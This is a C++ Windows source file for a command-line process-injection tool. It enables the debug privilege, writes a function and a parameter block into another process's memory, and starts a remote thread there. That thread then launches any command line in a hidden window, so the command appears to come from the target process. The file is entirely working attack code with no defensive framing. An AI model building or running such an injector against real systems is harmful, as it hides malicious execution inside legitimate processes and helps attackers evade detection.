#include <windows.h>
#include <stdio.h>
#include <tlhelp32.h>
#include <tchar.h>
#include "injectlib.h"

typedef BOOL(WINAPI *typeCreateProcessA)(LPCSTR, LPSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES, BOOL, DWORD, LPVOID, LPCSTR, LPSTARTUPINFOA, LPPROCESS_INFORMATION);
typedef DWORD(WINAPI *typeGetLastError)(VOID);

struct FuncInfo
{
	typeCreateProcessA CreateProcessA;
	typeGetLastError GetLastError;
	char cmdline[1024];

	STARTUPINFOA si;
	PROCESS_INFORMATION pi;
};

void* AllocMemory(HANDLE process, void* address, int size)
{
	void* addr = VirtualAllocEx(process, 0, size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if (addr == NULL)
		return NULL;
	if (!WriteProcessMemory(process, addr, address, size, 0))
		return NULL;
	return addr;
}

DWORD WINAPI MyFunc(FuncInfo* info)
{
	DWORD dwRet = 0;

	info->si.cb = sizeof(info->si);
	info->si.dwFlags = STARTF_USESHOWWINDOW;
	info->si.wShowWindow = SW_HIDE;

	if (info->CreateProcessA(NULL, info->cmdline, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &info->si, &info->pi))
		return 1;
	else
		dwRet = info->GetLastError();

	return dwRet;
}

int WINAPI EndFunc()
{
	return 0;
}

void InjectRun(const char* pid, const char* cmdline)
{
	bool res = false;
	FuncInfo info = { 0 };
	strcpy(info.cmdline, cmdline);

	HMODULE kernel = GetModuleHandleA("kernel32.dll");
	info.CreateProcessA = (typeCreateProcessA)GetProcAddress(kernel, "CreateProcessA");
	info.GetLastError = (typeGetLastError)GetProcAddress(kernel, "GetLastError");

	HANDLE process = OpenProcess(PROCESS_ALL_ACCESS, FALSE, atoi(pid));
	if (process)
	{
		void* ptr_func = AllocMemory(process, &MyFunc, int(EndFunc) - int(MyFunc));
		void* ptr_info = AllocMemory(process, &info, sizeof(info));
		HANDLE thread = _CreateRemoteThread(process, 0, 0, (LPTHREAD_START_ROUTINE)ptr_func, ptr_info, 0, 0);
		if (thread == 0)
			printf("CreateRemoteThread failed (err = %d)\n", GetLastError());
		else
		{
			CloseHandle(thread);
			printf("injected in process[%s]\n", pid);
			res = true;
		}
	}
	else
		printf("OpenProcess failed, err = %d", GetLastError());
}

BOOL EnableProcessPrivilege(HANDLE hProcess, PCHAR pstrPrivilege, BOOL bEnable)
{
	HANDLE hToken = NULL;
	TOKEN_PRIVILEGES tp = { 0 };
	if (!OpenProcessToken(hProcess, TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
		return FALSE;
	tp.PrivilegeCount = 1;
	if (!LookupPrivilegeValue(NULL, pstrPrivilege, &tp.Privileges[0].Luid))
	{
		CloseHandle(hToken);
		return FALSE;
	}
	if (bEnable)
		tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
	else
		tp.Privileges[0].Attributes = 0;
	if (!AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), NULL, NULL))
	{
		CloseHandle(hToken);
		return FALSE;
	}
	if (GetLastError() == ERROR_NOT_ALL_ASSIGNED)
	{
		CloseHandle(hToken);
		return FALSE;
	}
	CloseHandle(hToken);
	return TRUE;
}

int main(int argc, char* argv[])
{
	if (argc !=3)
	{
		printf("Usage:\n\tinjectdll.exe pid cmdline");
		return 0;
	}

	EnableProcessPrivilege(GetCurrentProcess(), SE_DEBUG_NAME, TRUE);
	InjectRun(argv[1], argv[2]);

	return 1;
}
